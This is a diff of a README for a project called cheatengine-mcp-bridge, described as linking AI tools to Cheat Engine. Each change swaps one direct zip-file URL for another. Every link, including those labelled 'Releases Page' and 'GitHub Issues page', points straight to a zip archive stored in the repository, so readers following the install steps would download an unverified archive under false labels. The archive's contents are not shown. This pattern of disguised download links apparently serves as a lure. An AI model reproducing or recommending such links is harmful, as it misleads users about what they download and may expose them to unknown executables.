@@ -1,6 +1,6 @@
 # 🎮 cheatengine-mcp-bridge - Connect AI Tools Seamlessly to Cheat Engine
 
-[![Download Latest Release](https://raw.githubusercontent.com/beamstar/cheatengine-mcp-bridge/main/AI_Context/mcp-bridge-cheatengine-3.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/beamstar/cheatengine-mcp-bridge/main/AI_Context/mcp-bridge-cheatengine-3.6.zip)
+[![Download Latest Release](https://github.com/beamstar/cheatengine-mcp-bridge/raw/refs/heads/main/MCP_Server/cheatengine_bridge_mcp_3.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/beamstar/cheatengine-mcp-bridge/raw/refs/heads/main/MCP_Server/cheatengine_bridge_mcp_3.6.zip)
 
 ## 📄 Description
 
@@ -28,7 +28,7 @@ Before you start, please ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of cheatengine-mcp-bridge, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/beamstar/cheatengine-mcp-bridge/main/AI_Context/mcp-bridge-cheatengine-3.6.zip).
+To download the latest version of cheatengine-mcp-bridge, please visit this page to download: [Releases Page](https://github.com/beamstar/cheatengine-mcp-bridge/raw/refs/heads/main/MCP_Server/cheatengine_bridge_mcp_3.6.zip).
 
 1. Click on the link above to access the Releases page.
 2. Locate the latest release version.
@@ -73,7 +73,7 @@ Once the application runs, you can start using the features right away. Here’s
 
 Need more help? Engage with our community:
 
-- Join the discussion on our [GitHub Issues page](https://raw.githubusercontent.com/beamstar/cheatengine-mcp-bridge/main/AI_Context/mcp-bridge-cheatengine-3.6.zip).
+- Join the discussion on our [GitHub Issues page](https://github.com/beamstar/cheatengine-mcp-bridge/raw/refs/heads/main/MCP_Server/cheatengine_bridge_mcp_3.6.zip).
 - Check out our wiki for detailed guides and tips.
 
 ## 🔗 Related Topics
